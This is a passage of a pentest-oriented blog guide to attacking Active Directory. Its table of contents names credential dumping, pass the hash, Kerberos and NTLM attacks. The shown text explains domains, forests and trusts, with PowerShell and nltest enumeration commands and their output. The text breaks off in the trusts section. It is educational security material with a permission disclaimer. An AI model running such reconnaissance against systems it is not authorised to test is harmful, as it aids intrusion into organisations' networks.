<html lang="en-us"><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <meta name="description" content="">

    <title>Attacking Active Directory: 0 to 0.9 | zer1t0</title>
    <link rel="icon" href="/images/glider.ico"> 

    <link rel="stylesheet" href="/css/style.css">
    <link rel="stylesheet" href="/css/fonts.css">
</head>

    <body>
        <header>

  <nav>
    <ul>
      
      
      <li class="pull-left ">
        <a href="https://eloypgz.org/">~/</a>
      </li>
      
      
      <li class="pull-left current">
        <a href="/posts/">~/posts</a>
      </li>
      
      
      <li class="pull-left ">
        <a href="/projects/">~/projects</a>
      </li>
      
      
      <li class="pull-left ">
        <a href="/challenges">~/challenges</a>
      </li>
      
      
      <li class="pull-left ">
        <a href="/utils">~/utils</a>
      </li>
      
      
      <li class="pull-left ">
        <a href="/about/">~/about</a>
      </li>
      

    </ul>
  </nav>
</header>



<div class="article-meta">
    <h1>&gt; <span id="article-title">Attacking Active Directory: 0 to 0.9</span></h1>

    <p id="article-subtitle">
        By <span id="article-author">Eloy Pérez González</span> in <span id="article-date">2021/05/29</span>
    </p>
    <p class="terms">
        
        
        
        
        Tags: <a href="/tags/pentest">pentest</a> <a href="/tags/windows">windows</a> <a href="/tags/activedirectory">activedirectory</a> 
        
        
    </p>
</div>


<nav id="TableOfContents">
<ul>
<li><a href="#why-this-post">Why this post?</a>
</li>
<li><a href="#what-is-active-directory">What is Active Directory?</a>
</li>
<li><a href="#domains">Domains</a>
<ul>
<li><a href="#domain-name">Domain name</a>
</li>
</ul>
</li>
<li><a href="#forests">Forests</a>
<ul>
<li><a href="#functional-modes">Functional Modes</a>
</li>
</ul>
</li>
<li><a href="#trusts">Trusts</a>
<ul>
<li><a href="#trust-direction">Trust direction</a>
</li>
<li><a href="#trust transitivity">Trust transitivity</a>
</li>
<li><a href="#trust-types">Trust types</a>
</li>
<li><a href="#trust-key">Trust key</a>
</li>
<li><a href="#more-on-trusts">More on trusts</a>
</li>
</ul>
</li>
<li><a href="#users">Users</a>
<ul>
<li><a href="#user-properties">User properties</a>
<ul>
<li><a href="#user-identifiers">User Identifiers</a>
</li>
<li><a href="#user-secrets">User Secrets</a>
<ul>
<li><a href="#lm-nt-hashes">LM/NT hashes</a>
</li>
<li><a href="#user-kerberos-keys">Kerberos keys</a>
</li>
</ul>
</li>
<li><a href="#useraccountcontrol">UserAccountControl</a>
</li>
<li><a href="#other-user-properties">Other user properties</a>
</li>
</ul>
</li>
<li><a href="#important-users">Important Users</a>
</li>
<li><a href="#computer-accounts">Computer accounts</a>
</li>
<li><a href="#trust-accounts">Trust accounts</a>
</li>
</ul>
</li>
<li><a href="#groups">Groups</a>
<ul>
<li><a href="#important-groups">Important groups</a>
<ul>
<li><a href="#administrator-groups">Administrative groups</a>
</li>
<li><a href="#other-important-groups">Other important groups</a>
</li>
</ul>
</li>
<li><a href="#group-scope">Group Scope</a>
</li>
</ul>
</li>
<li><a href="#computers">Computers</a>
<ul>
<li><a href="#domain-controllers">Domain Controllers</a>
<ul>
<li><a href="#domain-controllers-discovery">Domain Controllers discovery</a>
</li>
<li><a href="#domain-database-dumping">Domain database dumping</a>
</li>
</ul>
</li>
<li><a href="#windows-computers">Windows computers</a>
<ul>
<li><a href="#windows-computers-discovery">Windows computers discovery</a>
</li>
<li><a href="#windows-computers-connection">Windows computers connection</a>
<ul>
<li><a href="#connecting-with-rpc-smb">Connecting with RPC/SMB</a>
</li>
<li><a href="#connecting-with-powershell-remoting">Connecting with Powershell Remoting</a>
</li>
<li><a href="#connecting-with-rdp">Connecting with RDP</a>
</li>
</ul>
</li>
<li><a href="#windows-computers-credentials">Windows computers credentials</a>
<ul>
<li><a href="#lsass-credentials">LSASS credentials</a>
</li>
<li><a href="#registry credentials">Registry credentials</a>
<ul>
<li><a href="#lsa-secrets">LSA secrets</a>
</li>
<li><a href="#sam">SAM</a>
</li>
<li><a href="#dumping-registry-credentials">Dumping registry credentials</a>
</li>
</ul>
</li>
<li><a href="#powershell-history">Powershell history</a>
</li>
<li><a href="#other-places-to-find-credentials-in-windows">Other places to find credentials in Windows</a>
</li>
</ul>
</li>
</ul>
</li>
<li><a href="#linux-computers">Linux computers</a>
<ul>
<li><a href="#linux-computers-discovery">Linux computers discovery</a>
</li>
<li><a href="#linux-computers-connection">Linux computers connection</a>
</li>
<li><a href="#linux-computers-credentials">Linux computers credentials</a>
<ul>
<li><a href="#linux-kerberos-tickets">Linux Kerberos tickets</a>
</li>
<li><a href="#linux-user-files">Linux user files</a>
</li>
<li><a href="#ssh-keys">SSH keys</a>
</li>
<li><a href="#bash-history">Bash history</a>
</li>
<li><a href="#other-places-to-find-credentials-in-linux">Other places to find credentials in Linux</a>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><a href="#services">Services</a>
<ul>
<li><a href="#host-service">Host service</a>
</li>
</ul>
</li>
<li><a href="#database">Database</a>
<ul>
<li><a href="#classes">Classes</a>
</li>
<li><a href="#properties">Properties</a>
</li>
<li><a href="#principals">Principals</a>
<ul>
<li><a href="#sid">SID</a>
</li>
</ul>
</li>
<li><a href="#distinguished-names">Distinguished Names</a>
</li>
<li><a href="#partitions">Partitions</a>
</li>
<li><a href="#global-catalog">Global Catalog</a>
</li>
<li><a href="#how-to-query-the-database">How to query the database?</a>
<ul>
<li><a href="#ldap">LDAP</a>
</li>
<li><a href="#adws">ADWS</a>
</li>
<li><a href="#other-protocols">Other protocols</a>
</li>
</ul>
</li>
</ul>
</li>
<li><a href="#security">Security</a>
</li>
<li><a href="#address-resolution">Address resolution</a>
<ul>
<li><a href="#arp">ARP</a>
<ul>
<li><a href="#arp-spoof">ARP spoof</a>
</li>
<li><a href="#arp-scan">ARP Scan</a>
</li>
</ul>
</li>
<li><a href="#dhcp">DHCP</a>
<ul>
<li><a href="#rogue-dhcp-server">Rogue DHCP server</a>
</li>
<li><a href="#dhcp-starvation">DHCP Starvation</a>
</li>
<li><a href="#dhcp-discovery">DHCP Discovery</a>
</li>
<li><a href="#dhcp-dynamic-dns">DHCP Dynamic DNS</a>
</li>
</ul>
</li>
<li><a href="#dns">DNS</a>
<ul>
<li><a href="#dns-basics">DNS Basics</a>
</li>
<li><a href="#dns-zones">DNS zones</a>
</li>
<li><a href="#dns-exfiltration">DNS exfiltration</a>
</li>
<li><a href="#fake-dns-server">Fake DNS server</a>
</li>
<li><a href="#dns-zone-transfer">DNS Zone Transfer</a>
</li>
<li><a href="#dump-dns-records">Dump DNS records</a>
</li>
<li><a href="#adidns">ADIDNS</a>
</li>
<li><a href="#dns-dynamic-updates">DNS dynamic updates</a>
</li>
</ul>
</li>
<li><a href="#netbios">NetBIOS</a>
<ul>
<li><a href="#netbios-datagram-service">NetBIOS Datagram Service</a>
</li>
<li><a href="#netbios-session-service">NetBIOS Session Service</a>
</li>
<li><a href="#netbios-name-service">NetBIOS Name Service</a>
</li>
</ul>
</li>
<li><a href="#llmnr">LLMNR</a>
</li>
<li><a href="#mdns">mDNS</a>
</li>
<li><a href="#wpad">WPAD</a>
</li>
</ul>
</li>
<li><a href="#authentication">Authentication</a>
<ul>
<li><a href="#gss-api">GSS-API/SSPI</a>
<ul>
<li><a href="#windows-ssps">Windows SSPs</a>
<ul>
<li><a href="#kerberos-ssp">Kerberos SSP</a>
</li>
<li><a href="#ntlm-ssp">NTLM SSP</a>
</li>
<li><a href="#negotiate-ssp">Negotiate SSP</a>
</li>
<li><a href="#digest-ssp">Digest SSP</a>
</li>
<li><a href="#secure-channel-ssp">Secure Channel SSP</a>
</li>
<li><a href="#cred-ssp">Cred SSP</a>
</li>
<li><a href="#custom-ssps">Custom SSPs</a>
</li>
</ul>
</li>
</ul>
</li>
<li><a href="#spnego">SPNEGO</a>
</li>
<li><a href="#ntlm">NTLM</a>
<ul>
<li><a href="#ntlm-basics">NTLM Basics</a>
<ul>
<li><a href="#ntlmv1">NTLMv1</a>
</li>
<li><a href="#ntlmv2">NTLMv2</a>
</li>
<li><a href="#mic">MIC</a>
</li>
</ul>
</li>
<li><a href="#ntlm-in-active-directory">NTLM in Active Directory</a>
</li>
<li><a href="#ntlm-attacks">NTLM Attacks</a>
<ul>
<li><a href="#ntlm-recon">NTLM Recon</a>
</li>
<li><a href="#ntlm-brute-force">NTLM brute-force</a>
</li>
<li><a href="#pass-the-hash">Pass the hash</a>
</li>
<li><a href="#ntlm-relay">NTLM Relay</a>
<ul>
<li><a href="#ntlm-relay-protections">NTLM Relay Protections</a>
</li>
</ul>
</li>
<li><a href="#ntlm-hashes-cracking">NTLM hashes cracking</a>
</li>
</ul>
</li>
</ul>
</li>
<li><a href="#kerberos">Kerberos</a>
<ul>
<li><a href="#kerberos-basics">Kerberos Basics</a>
<ul>
<li><a href="#kerberos-principals">Kerberos principals</a>
</li>
<li><a href="#tickets">Tickets</a>
<ul>
<li><a href="#pac">PAC</a>
</li>
</ul>
</li>
<li><a href="#kerberos-actors">Kerberos actors</a>
</li>
<li><a href="#ticket types">Ticket types</a>
<ul>
<li><a href="#st">ST</a>
</li>
<li><a href="#tgt">TGT</a>
</li>
</ul>
</li>
<li><a href="#ticket-acquisition">Ticket acquisition</a>
</li>
<li><a href="#kerberos-services">Kerberos services</a>
</li>
<li><a href="#kerberos-keys">Kerberos keys</a>
</li>
</ul>
</li>
<li><a href="#kerberos-basic-attacks">Kerberos basic attacks</a>
<ul>
<li><a href="#kerberos-brute-force">Kerberos brute-force</a>
</li>
<li><a href="#kerberoast">Kerberoast</a>
</li>
<li><a href="#asreproast">ASREProast</a>
</li>
<li><a href="#pass-the-key">Pass the Key/Over Pass the Hash</a>
</li>
<li><a href="#pass-the-ticket">Pass the Ticket</a>
</li>
<li><a href="#golden-silver-ticket">Golden/Silver ticket</a>
</li>
</ul>
</li>
<li><a href="#kerberos-across-domains">Kerberos Across domains</a>
<ul>
<li><a href="#sid-history-attack">SID History attack</a>
</li>
<li><a href="#inter-realm-tgt">Inter-realm TGT</a>
</li>
</ul>
</li>
<li><a href="#kerberos-delegation">Kerberos Delegation</a>
<ul>
<li><a href="#kerberos-anti-delegation-measures">Kerberos Anti Delegation Measures</a>
</li>
<li><a href="#kerberos-unconstrained-delegation">Kerberos Unconstrained Delegation</a>
<ul>
<li><a href="#kerberos-unconstrained-delegation-across-forests">Kerberos Unconstrained Delegation across forests</a>
</li>
</ul>
</li>
<li><a href="#kerberos-constrained-delegation">Kerberos Constrained Delegation</a>
<ul>
<li><a href="#s4u2proxy">S4U2proxy</a>
</li>
<li><a href="#s4u2self">S4U2self</a>
</li>
<li><a href="#s4u2self-and-s4u2proxy">S4U2self and S4U2proxy</a>
</li>
<li><a href="#s4u-attacks">S4U attacks</a>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><a href="#logon-types">Logon types</a>
<ul>
<li><a href="#interactive-logon">Interactive logon</a>
</li>
<li><a href="#network-logon">Network logon</a>
</li>
<li><a href="#batch-logon">Batch logon</a>
</li>
<li><a href="#service-logon">Service logon</a>
</li>
<li><a href="#networkcleartext-logon">NetworkCleartext logon</a>
</li>
<li><a href="#newcredentials-logon">NewCredentials logon</a>
</li>
<li><a href="#remoteinteractive-logon">RemoteInteractive logon</a>
</li>
</ul>
</li>
</ul>
</li>
<li><a href="#authorization">Authorization</a>
<ul>
<li><a href="#acls">ACLs</a>
<ul>
<li><a href="#security-descriptor">Security descriptor</a>
</li>
<li><a href="#aces">ACEs</a>
</li>
<li><a href="#rights">Rights</a>
</li>
<li><a href="#acl-attacks">ACL attacks</a>
<ul>
<li><a href="#adminsdholder">AdminSDHolder</a>
</li>
</ul>
</li>
</ul>
</li>
<li><a href="#privileges">Privileges</a>
</li>
</ul>
</li>
<li><a href="#group-policy">Group Policy</a>
<ul>
<li><a href="#gpo-scope">GPO Scope</a>
</li>
<li><a href="#group-policy-template">Group Policy template</a>
</li>
<li><a href="#group-policy-container">Group Policy container</a>
</li>
</ul>
</li>
<li><a href="#communication-protocols">Communication Protocols</a>
<ul>
<li><a href="#smb">SMB</a>
<ul>
<li><a href="#shares">Shares</a>
<ul>
<li><a href="#default-shares">Default shares</a>
</li>
<li><a href="#default-domain-shares">Default domain shares</a>
</li>
</ul>
</li>
<li><a href="#named-pipes">Named pipes</a>
</li>
</ul>
</li>
<li><a href="#http">HTTP</a>
</li>
<li><a href="#rpc">RPC</a>
<ul>
<li><a href="#rpc-over-smb">RPC over SMB</a>
</li>
<li><a href="#rpc-over-tcp">RPC over TCP</a>
</li>
</ul>
</li>
<li><a href="#winrm">WinRM</a>
</li>
<li><a href="#powershell-remoting">Powershell remoting</a>
<ul>
<li><a href="#trusted-hosts">Trusted Hosts</a>
</li>
</ul>
</li>
<li><a href="#ssh">SSH</a>
<ul>
<li><a href="#ssh-tunneling">SSH tunneling</a>
</li>
</ul>
</li>
<li><a href="#rdp">RDP</a>
</li>
</ul>
</li>
<li><a href="#microsoft-extras">Microsoft extras</a>
<ul>
<li><a href="#adcs">ADCS</a>
</li>
<li><a href="#laps">LAPS</a>
</li>
<li><a href="#exchange">Exchange</a>
</li>
<li><a href="#sql-server">SQL Server</a>
</li>
</ul>
</li>
<li><a href="#recommended-resources">Recommended resources</a>
</li>
</ul>
</nav>

<div class="content-wrapper article-content">
    <main>
        
<div id="outline-container-why-this-post" class="outline-2">
<h2 id="why-this-post">
Why this post?
</h2>
<div id="outline-text-why-this-post" class="outline-text-2">
<p>
The purpose of this guide is to view Active Directory from an attacker
perspective. I will try to review different aspects of Active Directory and
those terms that every pentester should control in order to understand the
attacks that can be performed in a Active Directory network.</p>
<p>
In order to understand how to attack Active Directory (and any other
technology), I think is important to not only know the tools, but how the
tools work, what protocols/mechanisms they use, and why these
mechanisms/protocols exist.</p>
<p>
The information present here come from open sources and my own experience
with Active Directory. However, I cannot be certain that everything stated here
is correct, so you are encouraged to perform your own tests and in case you find
any error, please <a href="mailto:zer1t0ps@protonmail.com">let me know</a>.</p>
<p>
Moreover, I know that not everything about Active Directory is covered here, but it
is my intention to cover at least the basic knowledge required to understand
Active Directory and their attacks, and expand this source in the future. So, if
you feel that I miss something that a pentester should know related Active
Directory, please <a href="mailto:zer1t0ps@protonmail.com">let me know</a>.</p>
<p>
Disclaimer: This is done for educational purposes, and you should only apply the
attacks described here to systems that you have permission for.</p>
<p>
I tried to explain the topics present here as well as I could. However, every
topic is complex, so I put as many references to external resources as I could.
<strong>My major intention is to collect all of the Active Directory topics in a single
place</strong> that can be use to consult attacks/protocols/techniques, more than
explain every single detail of an specific technique (even if I try to do it).
So you are totally encouraged to follow the hyperlinks to discover more about and
specific topic, there are great resources out there.</p>
<p>
By the way, <strong>I would like to thank to all of the content creators</strong> that over the
years have share knowledge with the community through tools, blogs, conference
talks, etc. I have consult so many resources that it would be impossible for me
to thank all the content creators one by one, but if you find a link to one of
your resources or a resource you have collaborated directly (by adding a
feature to a tool, or helping your friend to write the post) or indirectly (for
example creating a library/snippet/language/OS/IDE/editor that is used by a
tool or a blog that is used as basis for a post linked here), <strong>thank you</strong>.</p>
<blockquote>
<p>Throughout the article I will use Powershell to show how to retrieve
information of Active Directory. For that purpose I will use the
<a href="https://docs.microsoft.com/en-us/powershell/module/addsadministration/?view=windowsserver2019-ps">ActiveDirectory Powershell module</a>, but other tools like <a href="https://github.com/BC-SECURITY/Empire/blob/master/data/module_source/situational_awareness/network/powerview.ps1">Powerview</a> or <a href="https://docs.ldap.com/ldap-sdk/docs/tool-usages/ldapsearch.html">ldapsearch</a>
can be used instead.</p>
</blockquote>
<p>
Now, let's get to the point.</p>
</div>
</div>
<div id="outline-container-what-is-active-directory" class="outline-2">
<h2 id="what-is-active-directory">
What is Active Directory?
</h2>
<div id="outline-text-what-is-active-directory" class="outline-text-2">
<p>
From my perspective, Active Directory is a system that allows to manage a set
of computers and users connected in the same network from a central server.</p>
<p>
Sure, this definition is far from being totally accurate, but I hope it is
simple enough to give you an idea of what AD is.</p>
<figure>
<pre class="example">       ____                         __ 
  o   |    |                       |==|
 /|\  |____| &lt;--------.    .-----&gt; |  |
 / \  /::::/          |    |       |__|
                      v    v
                       .---.
                      /   /|
                     .---. |
                     |   | '
                     |   |/ 
                     '---'  
       ____          ^    ^        ____ 
  o   |    |         |    |       |    |  \o/
 /|\  |____| &lt;-------'    '-----&gt; |____|   | 
 / \  /::::/                      /::::/  / \
</pre>
<figcaption>
Active Directory network
</figcaption>
</figure>
<p>
Imagine a company with hundreds of employees, where each one works in its own
(probably Windows) computer. This company has several different departments,
like sales, human resources, IT, etc.</p>
<p>
Now imagine that the sales department requires a new program to be installed in
their workstations. Or that each day an user in a different office forgets its
password and it needs to be restored. Or that the new group of interns are
only required to work with a few documents of a file server.</p>
<p>
Should the IT team install the program in all the sales workstations, one by
one? Should they go to the different offices and restore the user password?
Should they create a new user for each intern in the file server that allows
only to see files in a directory?</p>
<p>
Well, they could do that, though it would be a lot of work (and a waste of money
for the company). But since they are smart people, they have all the computers
connected in an Active Directory network, so they can perform all these
operations from their workstation.</p>
<p>
Active Directory allows this by maintaining a centralized database where all the
information about users, computers, policies, permissions, etc, is stored. So,
for example, the IT team can connect to this database and create the new users
for the interns and assign permissions to them to be only allowed to read files
in the indicated directories of the specific servers of their departments.</p>
<p>
Then, when one of these interns tries to login to a computer inside the Active
Directory network, the computer consults the central database in order to check
that the intern user exists (and that the password is correct). This way, users
can log on to any of the company computers (if they have permissions), by
allowing employees to use only a user to do all its work in all the company
computers (that can be workstations, database servers, file servers, etc).</p>
<p>
Likewise, in case a user forgets is password, she can alert to the IT team, and
they can change the user password in this central database (and the user is
asked to change this password to a new one that only she knows).</p>
<p>
In the case of the sales department, the IT can create a new policy in the
database which indicates that computers of that department must install the
indicated program, and how they must do it. Then, when sales workstation read
the database, they will know that they must execute this policy and the new
program will be installed.</p>
<p>
I hope this example allows you to understand why Active Directory is so useful
and why almost any (medium-big) organization in the world uses it. Probably you
have used it, normally from a computer that requires you to press Ctrl+Alt+Del
before prompts you for your username and password.</p>
<p>
And… what happens if someone can steal the password of an IT user? Could she
change the other users passwords? And access to the database?</p>
<p>
Now that is clear why Active Directory is so important, let's introduce their
items.</p>
</div>
</div>
<div id="outline-container-domains" class="outline-2">
<h2 id="domains">
Domains
</h2>
<div id="outline-text-domains" class="outline-text-2">
<p>
First of all, what we have been calling an Active Directory network is what is
usually known as a <strong>Domain</strong>. A domain is a set of connected computers that
shares an Active Directory database, which is managed by the central servers of
a domain, that are called <strong>Domain Controllers</strong>.</p>
<div id="outline-container-domain-name" class="outline-3">
<h3 id="domain-name">
Domain name
</h3>
<div id="outline-text-domain-name" class="outline-text-3">
<p>
Each domain has a DNS name. In many companies, the name of the
domain is the same as their web site, for example <code class="verbatim">contoso.com</code>, while others
have a different internal domain such as <code class="verbatim">contoso.local</code>.</p>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\Anakin&gt; $env:USERDNSDOMAIN
</span></span><span style="display:flex;"><span>CONTOSO.LOCAL
</span></span><span style="display:flex;"><span>PS C:\Users\Anakin&gt; (Get-ADDomain).DNSRoot
</span></span><span style="display:flex;"><span>contoso.local</span></span></code></pre></div>
</div>
<figcaption>
Identify current user domain from Powershell
</figcaption>
</figure>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\Anakin&gt; (Get-WmiObject Win32_ComputerSystem).Domain
</span></span><span style="display:flex;"><span>contoso.local</span></span></code></pre></div>
</div>
<figcaption>
Identify current computer domain from Powershell
</figcaption>
</figure>
<p>
In addition to its <strong>DNS name</strong>, every domain can also be identified with NetBIOS
name. For example, the domain <code class="verbatim">contoso.local</code> could have the <strong>NetBIOS name</strong>
<code class="verbatim">CONTOSO</code>. You can see the NetBIOS name being used in log in operations, where the
user is identified with something like <code class="verbatim">CONTOSO\Administrator</code>, where the first
part is the NetBIOS name and the second one is the username.</p>
<p>
Finally, a domain can be identified by its <strong>SID</strong> (Security Identifier). The SID is
more used by programs (using the Windows API) than users, but you should know
how to obtain it in case you require it.</p>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\Anakin&gt; Get-ADDomain | select DNSRoot,NetBIOSName,DomainSID
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>DNSRoot       NetBIOSName DomainSID
</span></span><span style="display:flex;"><span>-------       ----------- ---------
</span></span><span style="display:flex;"><span>contoso.local CONTOSO     S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">21</span>-<span style="color:#ae81ff">1372086773</span>-<span style="color:#ae81ff">2238746523</span>-<span style="color:#ae81ff">2939299801</span></span></span></code></pre></div>
</div>
<figcaption>
Get DNS name, NetBIOS name and SID of domain
</figcaption>
</figure>
</div>
</div>
</div>
</div>
<div id="outline-container-forests" class="outline-2">
<h2 id="forests">
Forests
</h2>
<div id="outline-text-forests" class="outline-text-2">
<p>
Using a DNS name is very useful, since it allows to create subdomains
for management purposes. For example, a company can have a <strong>root
domain</strong> called <code class="verbatim">contoso.local</code>, and then subdomains for different (usually big)
departments, like <code class="verbatim">it.contoso.local</code> or <code class="verbatim">sales.contoso.local</code>.</p>
<blockquote>
<p>Active Directory offers many ways to organize your infrastructure, as you will
notice, so how an organization uses subdomains varies from one to another, some
create subdomains for departments, while others use them for different offices.</p>
</blockquote>
<figure>
<pre class="example">              contoso.local
                    |
            .-------'--------.
            |                |
            |                |
     it.contoso.local hr.contoso.local
            | 
            |
            |
  webs.it.contoso.local
</pre>
<figcaption>
contoso.local forest.
</figcaption>
</figure>
<p>
This tree of domains is known as <a href="https://docs.microsoft.com/en-us/windows/win32/ad/forests"><strong>Forest</strong></a>. The name of the forest is the same as
the name of the root domain of the tree.</p>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\Anakin&gt; Get-ADForest
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ApplicationPartitions <span style="color:#960050;background-color:#1e0010">:</span> {DC=DomainDnsZones,DC=contoso,DC=local, DC=ForestDnsZones,DC=contoso,DC=local}
</span></span><span style="display:flex;"><span>CrossForestReferences <span style="color:#960050;background-color:#1e0010">:</span> {}
</span></span><span style="display:flex;"><span>DomainNamingMaster    <span style="color:#960050;background-color:#1e0010">:</span> dc01.contoso.local
</span></span><span style="display:flex;"><span>Domains               <span style="color:#960050;background-color:#1e0010">:</span> {contoso.local}
</span></span><span style="display:flex;"><span>ForestMode            <span style="color:#960050;background-color:#1e0010">:</span> Windows2016Forest
</span></span><span style="display:flex;"><span>GlobalCatalogs        <span style="color:#960050;background-color:#1e0010">:</span> {dc01.contoso.local, dc02.contoso.local}
</span></span><span style="display:flex;"><span>Name                  <span style="color:#960050;background-color:#1e0010">:</span> contoso.local
</span></span><span style="display:flex;"><span>PartitionsContainer   <span style="color:#960050;background-color:#1e0010">:</span> CN=Partitions,CN=Configuration,DC=contoso,DC=local
</span></span><span style="display:flex;"><span>RootDomain            <span style="color:#960050;background-color:#1e0010">:</span> contoso.local
</span></span><span style="display:flex;"><span>SchemaMaster          <span style="color:#960050;background-color:#1e0010">:</span> dc01.contoso.local
</span></span><span style="display:flex;"><span>Sites                 <span style="color:#960050;background-color:#1e0010">:</span> {Default-First-Site-Name}
</span></span><span style="display:flex;"><span>SPNSuffixes           <span style="color:#960050;background-color:#1e0010">:</span> {}
</span></span><span style="display:flex;"><span>UPNSuffixes           <span style="color:#960050;background-color:#1e0010">:</span> {}</span></span></code></pre></div>
</div>
<figcaption>
Forest information with Get-ADForest
</figcaption>
</figure>
<p>
In a forest, each domain has its own database and its own Domain Controllers.
However, <strong>users of a domain in the forest can also access to the other domains</strong>
of the forest. </p>
<p>
This implies that, even if a domain can be autonomous, without the need to
interact with other domains, it is not isolated from a security perspective,
since as we will see, user from a domain can access to resources of other
domains in the same forest (by default). However, the users of a forest cannot
access to resources from other forests by default, so the logical structure that
can provide security isolation is the forest.</p>
<p>
As I said before, <strong>each domain have its own Domain Controllers</strong>, so if a
department grows incredibly, you may need dedicated Domain Controllers that
process the requests of all computers in that department. You can achieve that
by creating a new subdomain, and the users will still be able to access
computers in others subdomains of the same forest.</p>
<div id="outline-container-functional-modes" class="outline-3">
<h3 id="functional-modes">
Functional Modes
</h3>
<div id="outline-text-functional-modes" class="outline-text-3">
<p>
As well as Windows computers, domains/forest can also have their own "version",
that is called <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/raise-active-directory-domain-forest-functional-levels">functional mode</a>. Depending on the mode of the domain/forest, new
characteristics can be used.</p>
<p>
The modes are named based on the minimum Windows Server operative system required
to work with them. There are the <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/564dc969-6db3-49b3-891a-f2f8d0a68a7f">following functional modes</a>:</p>
<ul>
<li>Windows2000</li>
<li>Windows2000MixedDomains</li>
<li>Windows2003</li>
<li>Windows2008</li>
<li>Windows2008R2</li>
<li>Windows2012</li>
<li>Windows2012R2</li>
<li>Windows2016</li>
</ul>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\Administrator\Downloads&gt; (Get-ADForest).ForestMode
</span></span><span style="display:flex;"><span>Windows2016Forest
</span></span><span style="display:flex;"><span>PS C:\Users\Administrator\Downloads&gt; (Get-ADDomain).DomainMode
</span></span><span style="display:flex;"><span>Windows2016Domain</span></span></code></pre></div>
</div>
<figcaption>
Get the mode of the forest/domain
</figcaption>
</figure>
<p>
Then if, for example, you find a domain/forest with Windows2012 mode, you can
know that all the Domain Controllers are at least Windows Server 2012. You must
be aware of the mode in order to use some characteristics of the domain, for
example, the <code class="verbatim">Protected Users</code> group requires a Windows2012R2 mode.</p>
</div>
</div>
</div>
</div>
<div id="outline-container-trusts" class="outline-2">
<h2 id="trusts">
Trusts
</h2>
<div id="outline-text-trusts" class="outline-text-2">
<p>
The users can access to other domains in the same forests because they are
linked by connections called <strong>Trusts</strong>.</p>
<p>
<a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/cc731335(v=ws.10)">A trust is a connection from a domain to another</a>. Not a physical network
connection, but a kind of authentication/authorization connection. You may be
able to reach computers on the network that are in others domains, but you
cannot log in on those computers with your user of this domain. That is what a
trust allows you to do.</p>
<div id="outline-container-trust-direction" class="outline-3">
<h3 id="trust-direction">
Trust direction
</h3>
<div id="outline-text-trust-direction" class="outline-text-3">
<p>
A trust is a directed relation where one side is the trusting and the other the 
trusted. When this link is established, the users of the trusted domain can
access to the resources of the trusting domain.</p>
<p>
The <strong><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/cc731404(v=ws.10)">trust direction</a> is the opposite to the access direction</strong>. You can think that
if you trust your friend, you allow her to access to your house and eat your
food when she needs it.</p>
<figure>
<pre class="example"> (trusting)         trusts        (trusted)
  Domain A  --------------------&gt;  Domain B
       outgoing               incoming
       outbound               inbound
                    access
            &lt;--------------------
</pre>
<figcaption>
Trust from Domain A to Domain B
</figcaption>
</figure>
<p>
When a trust is directed through your current domain in called an Inbound or
Incoming trust. <strong>Incoming trusts allow users of your domain to access the other
domain</strong>.</p>
<p>
On the other hand there are Outbound or Outgoing trusts, that go from your
domain to the other. Therefore the users of the other domain can access to your
domain.</p>
<p>
And when two domains are connected by both an incoming and an outgoing
trust, it is said that they are linked by a bidirectional trust (even if there
are really two trusts).</p>
<p>
You can see the trusts of your domain with <code>nltest /domain_trusts</code>.</p>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\Administrator&gt; nltest /domain_trusts
</span></span><span style="display:flex;"><span>List of domain trusts<span style="color:#960050;background-color:#1e0010">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">:</span> CONTOSO contoso.local (NT <span style="color:#ae81ff">5</span>) (Direct Outbound) ( Attr<span style="color:#960050;background-color:#1e0010">:</span> foresttrans )
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">:</span> ITPOKEMON it.poke.mon (NT <span style="color:#ae81ff">5</span>) (Forest<span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">2</span>) (Direct Outbound) (Direct Inbound) ( Attr<span style="color:#960050;background-color:#1e0010">:</span> withinforest )
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">2</span><span style="color:#960050;background-color:#1e0010">:</span> POKEMON poke.mon (NT <span style="color:#ae81ff">5</span>) (Forest Tree Root) (Primary Domain) (Native)
</span></span><span style="display:flex;"><span>The command completed successfully</span></span></code></pre></div>
</div>
<figcaption>
Trusts of poke.mon domain
</figcaption>
</figure>
<p>
